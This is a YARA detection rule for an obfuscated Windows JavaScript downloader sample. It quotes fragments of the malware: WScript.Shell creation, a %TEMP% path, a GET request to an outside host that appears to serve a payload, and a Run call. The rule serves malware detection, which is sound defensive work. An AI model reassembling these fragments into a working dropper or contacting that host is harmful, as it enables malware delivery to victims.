rule sig_20160427_a82d5a4472b4194cbc330a04c768def5 {
  meta:
    description = "datamaliciousorder - file 20160427_a82d5a4472b4194cbc330a04c768def5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9eb2f1294237a310074e121855d3969964d60d36c4bffc5c7a5fe70ce99a67ff"

  strings:
    $s1  = "function CztzhQykyl() {return UpleiGeyog[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mZMJKeD" ascii
    $s2  = "function CztzhQykyl() {return UpleiGeyog[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mZMJKeD" ascii
    $s3  = "var UpleiGeyog = function GituwExyvm() {return KqiqlIpmth[LobxbFmkwd](\"WScript\"+\".Shell\");}(), EyyydLnfqk = 11;" fullword ascii
    $s4  = "NnotwEqhen[QsytxSwkvr](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s5  = "var KqiqlIpmth = this[\"WScript\"];" fullword ascii
    $s6  = "function SzfpuEjhiw(){return ThcjkRtjjj + \"\";};" fullword ascii
    $s7  = "if (NnotwEqhen[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function IkjfxHcata(XodnrOolcd, NimwgDbqri){BvkluAmgji = BvkluAmgji * 1; return XodnrOolcd - NimwgDbqri;};" fullword ascii
    $s9  = "function BzzdpDxuoc() {return ((RfomgCblkm == true) && (RfomgCblkm == LnxloRhuak)) ? 1 : BvkluAmgji;};" fullword ascii
    $s10 = "var PabxuMtnvn = false;" fullword ascii
    $s11 = "function DmldxCniqo(){return 23;};" fullword ascii
    $s12 = "var LnxloRhuak = false;" fullword ascii
    $s13 = "LnxloRhuak = true; " fullword ascii
    $s14 = "}while (SqbebWlrkq);" fullword ascii
    $s15 = "function VzcmyKjedp()" fullword ascii
    $s16 = "PabxuMtnvn = true;" fullword ascii
    $s17 = "RfomgCblkm = true; " fullword ascii
    $s18 = "function ZiepjMeqpy(){return LobxbFmkwd;};" fullword ascii
    $s19 = "function HrnwaKicgz(PxiwrBnfle){UpleiGeyog[\"R\"+\"un\"](PxiwrBnfle, BvkluAmgji, BvkluAmgji);};" fullword ascii
    $s20 = "function NdqdjFzxoz(KddxtCebmd) {var UmjitAiymt = (1, 2, 3, 4, 5, KddxtCebmd); return UmjitAiymt;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}